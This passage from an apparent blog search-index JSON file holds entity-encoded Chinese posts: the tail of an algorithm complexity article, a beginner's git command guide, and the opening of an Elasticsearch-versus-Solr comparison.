&#x8FD9;&#x91CC;&#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x662F;&#x4EE5;F(n)&#x6700;&#x574F;&#x60C5;&#x51B5;&#x5206;&#x6790;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;100%&#x4FDD;&#x8BC1;&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x8D85;&#x8FC7;&#x4E34;&#x754C;&#x6761;&#x4EF6;n0&#x65F6;&#xFF0C;&#x7B97;&#x6CD5;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x4E0D;&#x4F1A;&#x9AD8;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0A;&#x786E;&#x754C;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x80FD;100%&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x4F1A;&#x4F4E;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#xFF0C;&#x800C;&#x53EA;&#x80FD;100%&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x4F1A;&#x4F4E;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#x3002; &#x76F8;&#x5173;&#x94FE;&#x63A5;&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x548C;&#x7A7A;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x603B;&#x7ED3;&#xFF1A;http://blog.csdn.net/zolalad/article/details/11848739","raw":null,"content":null,"categories":[{"name":"算法及理论","slug":"算法及理论","permalink":"http://www.wangxin123.com/categories/算法及理论/"}],"tags":[{"name":"算法复杂度","slug":"算法复杂度","permalink":"http://www.wangxin123.com/tags/算法复杂度/"}]},{"title":"git使用简易指南","slug":"git使用简易指南","date":"2016-07-20T13:18:00.000Z","updated":"2016-11-17T11:59:42.673Z","comments":true,"path":"2016/07/20/git使用简易指南/","link":"","permalink":"http://www.wangxin123.com/2016/07/20/git使用简易指南/","excerpt":"&#x5B89;&#x88C5;&#x4E0B;&#x8F7D; git OSX &#x7248;&#x4E0B;&#x8F7D; git Windows &#x7248;&#x4E0B;&#x8F7D; git Linux &#x7248; &#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;&#x521B;&#x5EFA;&#x65B0;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6253;&#x5F00;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;1git init &#x4EE5;&#x521B;&#x5EFA;&#x65B0;&#x7684; git &#x4ED3;&#x5E93;&#x3002; &#x68C0;&#x51FA;&#x4ED3;&#x5E93;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7684;&#x514B;&#x9686;&#x7248;&#x672C;&#xFF1A;1git clone /path/to/repository &#x5982;&#x679C;&#x662F;&#x8FDC;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x4F60;&#x7684;&#x547D;&#x4EE4;&#x4F1A;&#x662F;&#x8FD9;&#x4E2A;&#x6837;&#x5B50;&#xFF1A;1git clone username@host:/path/to/repository &#x5DE5;&#x4F5C;&#x6D41;&#x4F60;&#x7684;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7531; git &#x7EF4;&#x62A4;&#x7684;&#x4E09;&#x68F5;&#x201C;&#x6811;&#x201D;&#x7EC4;&#x6210;&#x3002;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;&#x4F60;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#xFF0C;&#x5B83;&#x6301;&#x6709;&#x5B9E;&#x9645;&#x6587;&#x4EF6;&#xFF1B;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F; &#x7F13;&#x5B58;&#x533A;&#xFF08;Index&#xFF09;&#xFF0C;&#x5B83;&#x50CF;&#x4E2A;&#x7F13;&#x5B58;&#x533A;&#x57DF;&#xFF0C;&#x4E34;&#x65F6;&#x4FDD;&#x5B58;&#x4F60;&#x7684;&#x6539;&#x52A8;&#xFF1B;&#x6700;&#x540E;&#x662F;HEAD&#xFF0C;&#x6307;&#x5411;&#x4F60;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x63D0;&#x4EA4;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x3002;","keywords":null,"text":"&#x5B89;&#x88C5;&#x4E0B;&#x8F7D; git OSX &#x7248;&#x4E0B;&#x8F7D; git Windows &#x7248;&#x4E0B;&#x8F7D; git Linux &#x7248; &#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;&#x521B;&#x5EFA;&#x65B0;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6253;&#x5F00;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;1git init &#x4EE5;&#x521B;&#x5EFA;&#x65B0;&#x7684; git &#x4ED3;&#x5E93;&#x3002; &#x68C0;&#x51FA;&#x4ED3;&#x5E93;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7684;&#x514B;&#x9686;&#x7248;&#x672C;&#xFF1A;1git clone /path/to/repository &#x5982;&#x679C;&#x662F;&#x8FDC;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x4F60;&#x7684;&#x547D;&#x4EE4;&#x4F1A;&#x662F;&#x8FD9;&#x4E2A;&#x6837;&#x5B50;&#xFF1A;1git clone username@host:/path/to/repository &#x5DE5;&#x4F5C;&#x6D41;&#x4F60;&#x7684;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7531; git &#x7EF4;&#x62A4;&#x7684;&#x4E09;&#x68F5;&#x201C;&#x6811;&#x201D;&#x7EC4;&#x6210;&#x3002;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;&#x4F60;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#xFF0C;&#x5B83;&#x6301;&#x6709;&#x5B9E;&#x9645;&#x6587;&#x4EF6;&#xFF1B;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F; &#x7F13;&#x5B58;&#x533A;&#xFF08;Index&#xFF09;&#xFF0C;&#x5B83;&#x50CF;&#x4E2A;&#x7F13;&#x5B58;&#x533A;&#x57DF;&#xFF0C;&#x4E34;&#x65F6;&#x4FDD;&#x5B58;&#x4F60;&#x7684;&#x6539;&#x52A8;&#xFF1B;&#x6700;&#x540E;&#x662F;HEAD&#xFF0C;&#x6307;&#x5411;&#x4F60;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x63D0;&#x4EA4;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x3002; &#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;&#x4F60;&#x53EF;&#x4EE5;&#x8BA1;&#x5212;&#x6539;&#x52A8;&#xFF08;&#x628A;&#x5B83;&#x4EEC;&#x6DFB;&#x52A0;&#x5230;&#x7F13;&#x5B58;&#x533A;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#xFF1A;12git add &lt;filename&gt;git add * &#x8FD9;&#x662F; git &#x57FA;&#x672C;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7684;&#x7B2C;&#x4E00;&#x6B65;&#xFF1B;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5B9E;&#x9645;&#x63D0;&#x4EA4;&#x6539;&#x52A8;&#xFF1A;1git commit -m &quot;&#x4EE3;&#x7801;&#x63D0;&#x4EA4;&#x4FE1;&#x606F;&quot; &#x73B0;&#x5728;&#xFF0C;&#x4F60;&#x7684;&#x6539;&#x52A8;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x5230;&#x4E86; HEAD&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x6CA1;&#x5230;&#x4F60;&#x7684;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#x3002; &#x63A8;&#x9001;&#x6539;&#x52A8;&#x4F60;&#x7684;&#x6539;&#x52A8;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x5728;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7684; HEAD &#x4E2D;&#x4E86;&#x3002;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x6539;&#x52A8;&#x63D0;&#x4EA4;&#x5230;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#xFF1A;1git push origin master &#x53EF;&#x4EE5;&#x628A; master &#x6362;&#x6210;&#x4F60;&#x60F3;&#x8981;&#x63A8;&#x9001;&#x7684;&#x4EFB;&#x4F55;&#x5206;&#x652F;&#x3002; &#x5982;&#x679C;&#x4F60;&#x8FD8;&#x6CA1;&#x6709;&#x514B;&#x9686;&#x73B0;&#x6709;&#x4ED3;&#x5E93;&#xFF0C;&#x5E76;&#x6B32;&#x5C06;&#x4F60;&#x7684;&#x4ED3;&#x5E93;&#x8FDE;&#x63A5;&#x5230;&#x67D0;&#x4E2A;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x6DFB;&#x52A0;&#xFF1A;1git remote add origin &lt;server&gt; &#x5982;&#x6B64;&#x4F60;&#x5C31;&#x80FD;&#x591F;&#x5C06;&#x4F60;&#x7684;&#x6539;&#x52A8;&#x63A8;&#x9001;&#x5230;&#x6240;&#x6DFB;&#x52A0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x53BB;&#x4E86;&#x3002; &#x5206;&#x652F;&#x5206;&#x652F;&#x662F;&#x7528;&#x6765;&#x5C06;&#x7279;&#x6027;&#x5F00;&#x53D1;&#x7EDD;&#x7F18;&#x5F00;&#x6765;&#x7684;&#x3002;&#x5728;&#x4F60;&#x521B;&#x5EFA;&#x4ED3;&#x5E93;&#x7684;&#x65F6;&#x5019;&#xFF0C;master &#x662F;&#x201C;&#x9ED8;&#x8BA4;&#x7684;&#x201D;&#x3002;&#x5728;&#x5176;&#x4ED6;&#x5206;&#x652F;&#x4E0A;&#x8FDB;&#x884C;&#x5F00;&#x53D1;&#xFF0C;&#x5B8C;&#x6210;&#x540E;&#x518D;&#x5C06;&#x5B83;&#x4EEC;&#x5408;&#x5E76;&#x5230;&#x4E3B;&#x5206;&#x652F;&#x4E0A;&#x3002; &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EB;&#x505A;&#x201C;feature_x&#x201D;&#x7684;&#x5206;&#x652F;&#xFF0C;&#x5E76;&#x5207;&#x6362;&#x8FC7;&#x53BB;&#xFF1A;1git checkout -b feature_x &#x5207;&#x6362;&#x56DE;&#x4E3B;&#x5206;&#x652F;&#xFF1A;1git checkout master &#x518D;&#x628A;&#x65B0;&#x5EFA;&#x7684;&#x5206;&#x652F;&#x5220;&#x6389;&#xFF1A;1git branch -d feature_x &#x9664;&#x975E;&#x4F60;&#x5C06;&#x5206;&#x652F;&#x63A8;&#x9001;&#x5230;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#xFF0C;&#x4E0D;&#x7136;&#x8BE5;&#x5206;&#x652F;&#x5C31;&#x662F; &#x4E0D;&#x4E3A;&#x4ED6;&#x4EBA;&#x6240;&#x89C1;&#x7684;&#xFF1A;1git push origin &lt;branch&gt; &#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;&#x8981;&#x66F4;&#x65B0;&#x4F60;&#x7684;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x81F3;&#x6700;&#x65B0;&#x6539;&#x52A8;&#xFF0C;&#x6267;&#x884C;&#xFF1A;1git pull &#x4EE5;&#x5728;&#x4F60;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x4E2D; &#x83B7;&#x53D6;&#xFF08;fetch&#xFF09; &#x5E76; &#x5408;&#x5E76;&#xFF08;merge&#xFF09; &#x8FDC;&#x7AEF;&#x7684;&#x6539;&#x52A8;&#x3002;&#x8981;&#x5408;&#x5E76;&#x5176;&#x4ED6;&#x5206;&#x652F;&#x5230;&#x4F60;&#x7684;&#x5F53;&#x524D;&#x5206;&#x652F;&#xFF08;&#x4F8B;&#x5982; master&#xFF09;&#xFF0C;&#x6267;&#x884C;&#xFF1A;1git merge &lt;branch&gt; &#x4E24;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;git &#x90FD;&#x4F1A;&#x5C1D;&#x8BD5;&#x53BB;&#x81EA;&#x52A8;&#x5408;&#x5E76;&#x6539;&#x52A8;&#x3002;&#x4E0D;&#x5E78;&#x7684;&#x662F;&#xFF0C;&#x81EA;&#x52A8;&#x5408;&#x5E76;&#x5E76;&#x975E;&#x6B21;&#x6B21;&#x90FD;&#x80FD;&#x6210;&#x529F;&#xFF0C;&#x5E76;&#x53EF;&#x80FD;&#x5BFC;&#x81F4; &#x51B2;&#x7A81;&#xFF08;conflicts&#xFF09;&#x3002; &#x8FD9;&#x65F6;&#x5019;&#x5C31;&#x9700;&#x8981;&#x4F60;&#x4FEE;&#x6539;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x6765;&#x4EBA;&#x8089;&#x5408;&#x5E76;&#x8FD9;&#x4E9B; &#x51B2;&#x7A81;&#xFF08;conflicts&#xFF09; &#x4E86;&#x3002;&#x6539;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5C06;&#x5B83;&#x4EEC;&#x6807;&#x8BB0;&#x4E3A;&#x5408;&#x5E76;&#x6210;&#x529F;&#xFF1A;1git add &lt;filename&gt; &#x5728;&#x5408;&#x5E76;&#x6539;&#x52A8;&#x4E4B;&#x524D;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#xFF1A;1git diff &lt;source_branch&gt; &lt;target_branch&gt; &#x6807;&#x7B7E;&#x5728;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x65F6;&#x521B;&#x5EFA;&#x6807;&#x7B7E;&#xFF0C;&#x662F;&#x88AB;&#x63A8;&#x8350;&#x7684;&#x3002;&#x8FD9;&#x662F;&#x4E2A;&#x65E7;&#x6709;&#x6982;&#x5FF5;&#xFF0C;&#x5728; SVN &#x4E2D;&#x4E5F;&#x6709;&#x3002;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EB;&#x505A; 1.0.0 &#x7684;&#x6807;&#x7B7E;&#xFF1A;1git tag 1.0.0 1b2e1d63ff 1b2e1d63ff &#x662F;&#x4F60;&#x60F3;&#x8981;&#x6807;&#x8BB0;&#x7684;&#x63D0;&#x4EA4; ID &#x7684;&#x524D; 10 &#x4F4D;&#x5B57;&#x7B26;&#x3002;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x83B7;&#x53D6;&#x63D0;&#x4EA4; ID&#xFF1A;1git log &#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x8BE5;&#x63D0;&#x4EA4; ID &#x7684;&#x5C11;&#x4E00;&#x4E9B;&#x7684;&#x524D;&#x51E0;&#x4F4D;&#xFF0C;&#x53EA;&#x8981;&#x5B83;&#x662F;&#x552F;&#x4E00;&#x7684;&#x3002; &#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;&#x5047;&#x5982;&#x4F60;&#x505A;&#x9519;&#x4E8B;&#xFF08;&#x81EA;&#x7136;&#xFF0C;&#x8FD9;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#xFF09;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x66FF;&#x6362;&#x6389;&#x672C;&#x5730;&#x6539;&#x52A8;&#xFF1A;1git checkout -- &lt;filename&gt; &#x6B64;&#x547D;&#x4EE4;&#x4F1A;&#x4F7F;&#x7528; HEAD &#x4E2D;&#x7684;&#x6700;&#x65B0;&#x5185;&#x5BB9;&#x66FF;&#x6362;&#x6389;&#x4F60;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5DF2;&#x6DFB;&#x52A0;&#x5230;&#x7F13;&#x5B58;&#x533A;&#x7684;&#x6539;&#x52A8;&#xFF0C;&#x4EE5;&#x53CA;&#x65B0;&#x6587;&#x4EF6;&#xFF0C;&#x90FD;&#x4E0D;&#x53D7;&#x5F71;&#x54CD;&#x3002; &#x5047;&#x5982;&#x4F60;&#x60F3;&#x8981;&#x4E22;&#x5F03;&#x4F60;&#x6240;&#x6709;&#x7684;&#x672C;&#x5730;&#x6539;&#x52A8;&#x4E0E;&#x63D0;&#x4EA4;&#xFF0C;&#x53EF;&#x4EE5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x83B7;&#x53D6;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#x5E76;&#x5C06;&#x4F60;&#x672C;&#x5730;&#x4E3B;&#x5206;&#x652F;&#x6307;&#x5411;&#x5230;&#x5B83;&#xFF1A;12git fetch origingit reset --hard origin/master &#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;&#x5185;&#x5EFA;&#x7684;&#x56FE;&#x5F62;&#x5316; git&#xFF1A;1gitk &#x5F69;&#x8272;&#x7684; git &#x8F93;&#x51FA;&#xFF1A;1git config color.ui true &#x663E;&#x793A;&#x5386;&#x53F2;&#x8BB0;&#x5F55;&#x65F6;&#xFF0C;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x884C;&#x6CE8;&#x91CA;&#x4FE1;&#x606F;&#xFF1A;1git config format.pretty oneline &#x4EA4;&#x4E92;&#x5730;&#x6DFB;&#x52A0;&#x6587;&#x4EF6;&#x81F3;&#x7F13;&#x5B58;&#x533A;&#xFF1A;1git add -i &#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;&#x56FE;&#x5F62;&#x5316;&#x754C;&#x9762;GitX (L) (OSX, open source)Tower (OSX)Source Tree (OSX, free)GitHub for Mac (OSX, free)GitBox (OSX) &#x6307;&#x5357;&#x4E0E;&#x624B;&#x518C;Git &#x793E;&#x533A;&#x53C2;&#x8003;&#x4E66;&#x4E13;&#x4E1A; Git&#x5982; git &#x601D;&#x8003;GitHub &#x5E2E;&#x52A9;&#x56FE;&#x5F62;&#x5316;&#x7684; Git &#x6307;&#x5357;&#x4E00;&#x5219;","raw":null,"content":null,"categories":[{"name":"其他技术","slug":"其他技术","permalink":"http://www.wangxin123.com/categories/其他技术/"}],"tags":[{"name":"git","slug":"git","permalink":"http://www.wangxin123.com/tags/git/"}]},{"title":"Elasticsearch与Solr","slug":"Elasticsearch与Solr","date":"2016-07-12T13:18:00.000Z","updated":"2017-02-21T08:42:02.325Z","comments":true,"path":"2016/07/12/Elasticsearch与Solr/","link":"","permalink":"http://www.wangxin123.com/2016/07/12/Elasticsearch与Solr/","excerpt":"&#x4EE5;&#x524D;&#x516C;&#x53F8;&#x6709;&#x4E2A;&#x7528;Lucene&#x5B9E;&#x73B0;&#x7684;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x9879;&#x76EE;&#xFF0C;&#x5B9E;&#x65F6;&#x6027;&#x5F88;&#x5DEE;&#xFF0C;&#x540E;&#x671F;&#x6570;&#x636E;&#x91CF;&#x9010;&#x6E10;&#x589E;&#x5927;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x540C;&#x6B65;&#x4E00;&#x6B21;&#x6570;&#x636E;&#x9700;&#x8981;&#x597D;&#x51E0;&#x4E2A;&#x5C0F;&#x65F6;&#x3002;&#x5F53;&#x65F6;&#x8003;&#x8651;&#x7528;solr&#x6216;ES&#x91CD;&#x6784;&#xFF0C;&#x56E0;&#x4E3A;&#x5BF9;&#x5B9E;&#x65F6;&#x6027;&#x8981;&#x6C42;&#x5F88;&#x9AD8;&#xFF0C;&#x6700;&#x7EC8;&#x9009;&#x62E9;&#x7684;&#x662F;ES&#x3002;&#x6211;&#x53C2;&#x4E0E;&#x7684;&#x662F;solr&#x6280;&#x672F;&#x7684;&#x9884;&#x7814;&#x3002; Elasticsearch&#x7B80;&#x4ECB;Elasticsearch&#x662F;&#x4E00;&#x4E2A;&#x5B9E;&#x65F6;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x548C;&#x5206;&#x6790;&#x5F15;&#x64CE;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x4F60;&#x7528;&#x524D;&#x6240;&#x672A;&#x6709;&#x7684;&#x901F;&#x5EA6;&#x53BB;&#x5904;&#x7406;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5168;&#x6587;&#x641C;&#x7D22;&#xFF0C;&#x7ED3;&#x6784;&#x5316;&#x641C;&#x7D22;&#x4EE5;&#x53CA;&#x5206;&#x6790;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E09;&#x8005;&#x8FDB;&#x884C;&#x7EC4;&#x5408;&#x3002; Elasticsearch&#x662F;&#x4E00;&#x4E2A;&#x5EFA;&#x7ACB;&#x5728;&#x5168;&#x6587;&#x641C;&#x7D22;&#x5F15;&#x64CE; Apache Lucene&#x2122; &#x57FA;&#x7840;&#x4E0A;&#x7684;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;Lucene&#x662F;&#x5F53;&#x4ECA;&#x6700;&#x5148;&#x8FDB;&#xFF0C;&#x6700;&#x9AD8;&#x6548;&#x7684;&#x5168;&#x529F;&#x80FD;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x6846;&#x67B6;&#x3002;&#x4F46;&#x662F;Lucene&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6846;&#x67B6;&#xFF0C;&#x8981;&#x5145;&#x5206;&#x5229;&#x7528;&#x5B83;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;JAVA&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x7A0B;&#x5E8F;&#x4E2D;&#x96C6;&#x6210;Lucene&#x3002;&#x9700;&#x8981;&#x5F88;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x4E86;&#x89E3;&#xFF0C;&#x624D;&#x80FD;&#x660E;&#x767D;&#x5B83;&#x662F;&#x5982;&#x4F55;&#x8FD0;&#x884C;&#x7684;&#xFF0C;Lucene&#x786E;&#x5B9E;&#x975E;&#x5E38;&#x590D;&#x6742;&#x3002; Elasticsearch&#x4F7F;&#x7528;Lucene&#x4F5C;&#x4E3A;&#x5185;&#x90E8;&#x5F15;&#x64CE;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4F7F;&#x7528;&#x5B83;&#x505A;&#x5168;&#x6587;&#x641C;&#x7D22;&#x65F6;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7EDF;&#x4E00;&#x5F00;&#x53D1;&#x597D;&#x7684;API&#x5373;&#x53EF;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x5176;&#x80CC;&#x540E;&#x590D;&#x6742;&#x7684;Lucene&#x7684;&#x8FD0;&#x884C;&#x539F;&#x7406;&#x3002;","keywords":null,"text":"&#x4EE5;&#x524D;&#x516C;&#x53F8;&#x6709;&#x4E2A;&#x7528;Lucene&#x5B9E;&#x73B0;&#x7684;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x9879;&#x76EE;&#xFF0C;&#x5B9E;&#x65F6;&#x6027;&#x5F88;&#x5DEE;&#xFF0C;&#x540E;&#x671F;&#x6570;&#x636E;&#x91CF;&#x9010;&#x6E10;&#x589E;&#x5927;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x540C;&#x6B65;&#x4E00;&#x6B21;&#x6570;&#x636E;&#x9700;&#x8981;&#x597D;&#x51E0;&#x4E2A;&#x5C0F;&#x65F6;&#x3002;&#x5F53;&#x65F6;&#x8003;&#x8651;&#x7528;solr&#x6216;ES&#x91CD;&#x6784;&#xFF0C;&#x56E0;&#x4E3A;&#x5BF9;&#x5B9E;&#x65F6;&#x6027;&#x8981;&#x6C42;&#x5F88;&#x9AD8;&#xFF0C;&#x6700;&#x7EC8;&#x9009;&#x62E9;&#x7684;&#x662F;ES&#x3002;&#x6211;&#x53C2;&#x4E0E;&#x7684;&#x662F;solr&#x6280;&#x672F;&#x7684;&#x9884;&#x7814;&#x3002; Elasticsearch&#x7B80;&#x4ECB;Elasticsearch&#x662F;&#x4E00;&#x4E2A;&#x5B9E;&#x65F6;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x548C;&#x5206;&#x6790;&#x5F15;&#x64CE;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x4F60;&#x7528;&#x524D;&#x6240;&#x672A;&#x6709;&#x7684;&#x901F;&#x5EA6;&#x53BB;&#x5904;&#x7406;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5168;&#x6587;&#x641C;&#x7D22;&#xFF0C;&#x7ED3;&#x6784;&#x5316;&#x641C;&#x7D22;&#x4EE5;&#x53CA;&#x5206;&#x6790;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E09;&#x8005;&#x8FDB;&#x884C;&#x7EC4;&#x5408;&#x3002; Elasticsearch&#x662F;&#x4E00;&#x4E2A;&#x5EFA;&#x7ACB;&#x5728;&#x5168;&#x6587;&#x641C;&#x7D22;&#x5F15;&#x64CE; Apache Lucene&#x2122; &#x57FA;&#x7840;&#x4E0A;&#x7684;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;Lucene&#x662F;&#x5F53;&#x4ECA;&#x6700;&#x5148;&#x8FDB;&#xFF0C;&#x6700;&#x9AD8;&#x6548;&#x7684;&#x5168;&#x529F;&#x80FD;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x6846;&#x67B6;&#x3002;&#x4F46;&#x662F;Lucene&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6846;&#x67B6;&#xFF0C;&#x8981;&#x5145;&#x5206;&#x5229;&#x7528;&#x5B83;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;JAVA&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x7A0B;&#x5E8F;&#x4E2D;&#x96C6;&#x6210;Lucene&#x3002;&#x9700;&#x8981;&#x5F88;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x4E86;&#x89E3;&#xFF0C;&#x624D;&#x80FD;&#x660E;&#x767D;&#x5B83;&#x662F;&#x5982;&#x4F55;&#x8FD0;&#x884C;&#x7684;&#xFF0C;Lucene&#x786E;&#x5B9E;&#x975E;&#x5E38;&#x590D;&#x6742;&#x3002; Elasticsearch&#x4F7F;&#x7528;Lucene&#x4F5C;&#x4E3A;&#x5185;&#x90E8;&#x5F15;&#x64CE;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4F7F;&#x7528;&#x5B83;&#x505A;&#x5168;&#x6587;&#x641C;&#x7D22;&#x65F6;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7EDF;&#x4E00;&#x5F00;&#x53D1;&#x597D;&#x7684;API&#x5373;&#x53EF;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x5176;&#x80CC;&#x540E;&#x590D;&#x6742;&#x7684;Lucene&#x7684;&#x8FD0;&#x884C;&#x539F;&#x7406;&#x3002; 